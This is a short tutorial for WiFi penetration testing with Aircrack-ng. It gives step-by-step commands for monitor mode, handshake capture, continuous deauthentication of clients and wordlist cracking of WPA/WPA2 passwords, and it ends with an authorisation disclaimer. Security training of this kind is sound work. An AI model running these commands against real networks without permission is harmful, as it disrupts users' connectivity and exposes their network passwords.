# WiFi Penetration Testing with Aircrack-ng

This guide provides a step-by-step process for performing WiFi penetration testing using Aircrack-ng to capture and crack WPA/WPA2 handshakes.

## Prerequisites
- Linux system (Kali Linux recommended)
- WiFi adapter that supports monitor mode
- Aircrack-ng suite installed (`sudo apt install aircrack-ng`)
- Wordlist for password cracking

## Setup WiFi Adapter (Monitor Mode)

1. Check current mode:
   ```bash
   iwconfig
   ```
   (Look for mode=managed)

2. Kill interfering processes:
   ```bash
   sudo airmon-ng check kill
   ```

3. Start monitor mode:
   ```bash
   sudo airmon-ng start wlan0
   ```
   (Replace `wlan0` with your interface name)

4. Verify monitor mode:
   ```bash
   iwconfig
   ```
   (Should show mode=monitor and new interface name like wlan0mon)

## Scan for Nearby Networks

```bash
sudo airodump-ng wlan0mon
```
(Replace `wlan0mon` with your monitor interface)

Note down:
- BSSID (MAC address of target AP)
- CH (channel number)
- ESSID (network name)

## Capture Handshake

```bash
sudo airodump-ng --bssid <BSSID> -c <CH> -w <output_file> wlan0mon
```
Example:
```bash
sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w capture wlan0mon
```

This will create a `.cap` file. Wait until you see `[WPA handshake: <BSSID>]` in the top right corner.

## Accelerate Handshake Capture (Deauth Attack)

In a new terminal:
```bash
sudo aireplay-ng --deauth 0 -a <BSSID> -c <client_MAC> wlan0mon
```
(Use 0 for continuous deauth, or specify a number of packets)

## Check for Captured Handshake

```bash
ls
```
Look for `.cap` file (e.g., `capture-01.cap`)

## Crack the Handshake

```bash
aircrack-ng <capture_file.cap> -w <wordlist_path>
```
Example:
```bash
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

## Cleanup

1. Stop monitor mode:
   ```bash
   sudo airmon-ng stop wlan0mon
   ```

2. Restart network manager:
   ```bash
   sudo systemctl start NetworkManager
   ```

## Legal Disclaimer

This guide is for educational and authorized penetration testing purposes only. Unauthorized access to computer networks is illegal. Always obtain proper authorization before testing any network.

## Wordlists

Popular wordlists for password cracking:
- rockyou.txt (included in Kali Linux)
- SecLists (https://github.com/danielmiessler/SecLists)
- CrackStation wordlist (https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)

Happy (ethical) hacking! 😊
